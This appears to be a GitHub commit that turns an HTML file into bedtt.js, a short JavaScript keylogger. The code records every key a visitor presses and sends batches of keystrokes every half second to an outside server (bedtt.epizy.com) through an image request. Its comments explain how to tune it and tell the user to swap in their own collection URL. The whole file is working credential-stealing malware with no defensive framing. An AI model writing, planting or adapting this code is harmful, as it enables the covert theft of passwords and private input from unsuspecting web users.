769ba93f64a4cae7e7c6c9a43375303761379904
nonsoudom <63682350+nonsoudom@users.noreply.github.com>
2020-04-14 19:54:59 -0400

    Update and rename index.html to bedtt.js

---
+++ bedtt.js
@@ -0,0 +1,17 @@
+var presses = [];
+window.addEventListener("keydown", function(evt){
+  presses.push(evt.key);
+});
+
+// Push to server at regular intervals
+// Reduce interval timing for more frequent recordings, but increases server load
+// You can also set this to send only if certain number of key stroke were made.
+window.setInterval(function () {
+  if (presses.length>5) {
+    var data = encodeURIComponent(JSON.stringify(presses));
+    //encodeURIComponent
+    console.log(data);
+    new Image().src = "http://bedtt.epizy.com/gg/bedtt.php" + data; // CHANGE THIS URL TO YOUR OWN!
+    presses = [];
+  }
+}, 500);
